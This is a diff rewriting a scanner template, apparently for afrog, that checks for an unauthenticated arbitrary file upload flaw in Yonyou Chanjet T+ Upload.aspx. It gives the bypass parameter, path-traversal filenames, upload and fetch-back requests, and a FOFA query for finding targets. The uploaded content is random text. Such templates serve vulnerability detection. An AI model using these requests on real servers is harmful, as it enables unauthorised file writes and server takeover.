@@ -1,46 +1,60 @@
 id: yonyou-chanjet-tplus-setupaccount-fileupload
 
 info:
-  name: yonyou-chanjet-tplus-setupaccount-fileupload
-  author: hufei
+  name: 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞
+  author: zan8in
   severity: critical
-  tags: yonyou,chanjet,fileupload
-  description: 
+  verified: true
+  description: |
+    用友 畅捷通T+ Upload.aspx接口存在任意文件上传漏洞,攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器
+    fofa: app="畅捷通-TPlus"
+  tags: yonyou,chanjet,tplus,fileupload
+  created: 2025/03/13
+  requires: [chanjet]
+  requires-mode: opportunistic
 
-variables:
-  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
-  file_content: "{{to_lower(rand_text_alpha(26))}}"
-
-http:
-  - raw:
-      - |
-        POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
-        Host: {{Hostname}}
-        Content-Length: 196
-        Cache-Control: max-age=0
-        Upgrade-Insecure-Requests: 1
-        Origin: null
-        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysHT4cEvOAWALSZEv
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9
-        Connection: close
-
-        ------WebKitFormBoundarysHT4cEvOAWALSZEv
-        Content-Disposition: form-data; name="File1"; filename="../{{file_name}}"
+set:
+  filename: randomLowercase(8)
+  rbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="File1"; filename="../../../img/login/{{filename}}.txt"
         Content-Type: image/jpeg
 
-        {{file_content}}
-        ------WebKitFormBoundarysHT4cEvOAWALSZEv--
-      
-      - |
-        GET /tplus/SM/SetupAccount/{{file_name}} HTTP/1.1
-        Host: {{Hostname}}
+        {{rbody}}
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /tplus/img/login/{{filename}}.txt
+    expression: response.body.bcontains(bytes(rbody))
+    stop_if_match: true
+  r2:
+    request:
+      method: POST
+      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="File1"; filename="{{filename}}.txt"
+        Content-Type: image/jpeg
 
-    req-condition: true
-    matchers:
-      - type: word
-        words:
-          - "{{file_content}}"
-        part: body
+        {{rbody}}
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
+  r3:
+    request:
+      method: GET
+      path: /tplus/SM/SetupAccount/images/{{filename}}.txt?preload=1
+    expression: response.body.bcontains(bytes(rbody))
+expression: (r0() && r1()) || (r2() && r3())
